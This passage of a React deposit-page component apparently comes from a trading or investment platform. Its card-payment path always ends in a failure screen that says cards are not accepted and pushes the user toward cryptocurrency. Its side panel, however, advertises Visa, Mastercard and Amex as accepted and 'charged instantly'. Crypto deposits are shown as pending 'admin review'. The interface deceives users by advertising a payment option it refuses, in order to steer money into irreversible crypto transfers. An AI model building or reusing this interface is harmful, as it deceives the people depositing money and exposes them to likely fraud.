              <div className={styles.doneRow}><span>Status</span><span style={{ color: '#ef4444' }}>● Failed</span></div>
              <div className={styles.doneRow}><span>Amount</span><span>{formatUSD(parseFloat(usdAmount) || 0)}</span></div>
              <div className={styles.doneRow}><span>Method</span><span>💳 Credit / Debit Card</span></div>
            </div>
            <div className={styles.doneActions}>
              <button className={styles.btnPrimary} onClick={handleSwitchToCrypto}>Continue with Crypto Instead →</button>
              <button
                className={styles.btnSecondary}
                onClick={() => { setSubmitError(''); resetCardForm(); setStep('details'); }}
              >
                Try Card Again
              </button>
            </div>
          </div>
        )}

        {/* ════════════════════════════════════════
            DONE — Now shows different content for card vs crypto
        ════════════════════════════════════════ */}
        {step === 'done' && method === 'card' && (
          <div className={styles.fullCard}>
            <div className={styles.doneRing} style={{ borderColor: '#f59e0b50', background: '#f59e0b12' }}>
              <div className={styles.doneIcon} style={{ color: '#f59e0b' }}>
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
              </div>
            </div>
            <h2 className={styles.doneTitle}>Sorry for the inconvenience</h2>
            <p className={styles.doneText}>
              We don't accept card payments at this time. Please use cryptocurrency instead.
            </p>
            <div className={styles.doneActions}>
              <button className={styles.btnPrimary} onClick={handleSwitchToCrypto}>Continue with Crypto →</button>
            </div>
          </div>
        )}

        {step === 'done' && method === 'crypto' && (
          <div className={styles.fullCard}>
            <div className={styles.doneRing} style={{ borderColor: '#1565C050', background: '#1565C012' }}>
              <div className={styles.doneIcon} style={{ color: '#1565C0' }}>
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
              </div>
            </div>
            <h2 className={styles.doneTitle}>Deposit Submitted!</h2>
            <p className={styles.doneText}>
              Your crypto deposit of{' '}
              <strong style={{ color: '#1565C0' }}>{formatUSD(parseFloat(usdAmount))}</strong> is pending admin review.
            </p>
            <div className={styles.doneDetails}>
              <div className={styles.doneRow}><span>Status</span><span className={styles.statusPending}>● Pending</span></div>
              <div className={styles.doneRow}><span>Amount</span><span>{formatUSD(parseFloat(usdAmount))}</span></div>
              <div className={styles.doneRow}><span>Method</span><span>₿ {selectedNetwork?.symbol ?? 'Crypto'}</span></div>
              <div className={styles.doneRow}><span>Est. time</span><span>10–30 minutes</span></div>
            </div>
            <div className={styles.doneActions}>
              <button className={styles.btnPrimary} onClick={handleReset}>Make Another Deposit</button>
              <a href="/dashboard/transactions" className={styles.btnSecondary}>View Transaction History</a>
            </div>
          </div>
        )}
      </div>

      {/* Side info panel */}
      <div className={styles.widgetSide}>
        <div style={{ padding: '24px', height: '100%', display: 'flex', flexDirection: 'column', gap: '16px' }}>
          <h3 style={{ fontSize: '16px', fontWeight: 700, color: '#fff', marginBottom: '4px' }}>Funding Methods</h3>
          {[
            { emoji: '💳', title: 'Credit / Debit Card', lines: ['Visa, Mastercard & Amex accepted', 'Charged instantly via secure checkout', 'Card details never touch our servers', 'Minimum: $10'] },
            { emoji: '₿', title: 'Cryptocurrency', lines: ['Supports BTC, ETH, USDT & more', 'Credited after network confirmations', 'Processing: 10–30 minutes', 'Minimum varies by coin'] },
          ].map((m) => (
            <div key={m.title} style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: '12px', padding: '16px' }}>
              <div style={{ fontSize: '18px', marginBottom: '8px' }}>{m.emoji}</div>
              <div style={{ fontSize: '14px', fontWeight: 700, color: '#fff', marginBottom: '8px' }}>{m.title}</div>
              {m.lines.map((l) => (
                <div key={l} style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: '#1565C0', flexShrink: 0 }} />
                  <span style={{ fontSize: '12px', color: '#9ca3af' }}>{l}</span>
                </div>
              ))}
            </div>
          ))}
          <div style={{ background: 'rgba(21,101,192,0.08)', border: '1px solid rgba(21,101,192,0.2)', borderRadius: '12px', padding: '14px' }}>
            <div style={{ fontSize: '12px', color: '#9ca3af', lineHeight: '1.6' }}>
              🔒 All deposits are reviewed by our compliance team. Funds appear in your account after verification.
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}